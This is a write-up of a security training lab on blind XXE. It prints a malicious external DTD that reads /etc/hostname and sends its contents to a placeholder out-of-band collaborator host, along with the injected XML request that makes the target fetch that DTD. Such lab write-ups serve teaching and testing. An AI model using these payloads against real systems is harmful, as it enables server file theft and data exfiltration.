# Lab 05: Exploiting Blind XXE to Exfiltrate Data via a Malicious External DTD

### 🎯 Objective
Exfiltrate the contents of the `/etc/hostname` file from a target server using a blind XXE vulnerability and an externally hosted malicious DTD.

### 🔍 Attack Overview
Since the application does not return any data in its responses (Blind XXE), we must use an **Out-of-Band (OOB)** technique. This involves hosting a DTD file that triggers a "chain reaction": reading a local file and then sending its content as a URL parameter to our Burp Collaborator server.



### 🛠️ Exploitation Steps

#### 1. Hosting the Malicious DTD
On the **Exploit Server**, I saved a DTD file with the following payload:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '[http://YOUR-COLLABORATOR-ID.oastify.com/?x=%file];'>">
%eval;
%exfil;

    %file: Reads the target file (/etc/hostname).

    %eval: Defines another entity (%exfil) dynamically.

    %exfil: Makes an HTTP request to my server, carrying the file content in the x parameter.

2. Triggering the Vulnerability

I intercepted the "Check stock" request and injected a parameter entity that forces the server to fetch and execute my remote DTD:
XML

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "[https://exploit-server.net/exploit]">
    %xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>

3. Data Extraction

Checking the Burp Collaborator logs, I observed:

    DNS Lookup: Proved the server reached out to my domain.

    HTTP Request: The server performed a GET request where the x parameter contained the actual hostname.

🚩 Evidence & Result

    Captured Hostname: [REDACTED]

    Log Entry: GET /?x=[REDACTED] HTTP/1.1

    Status: ✅ Solved
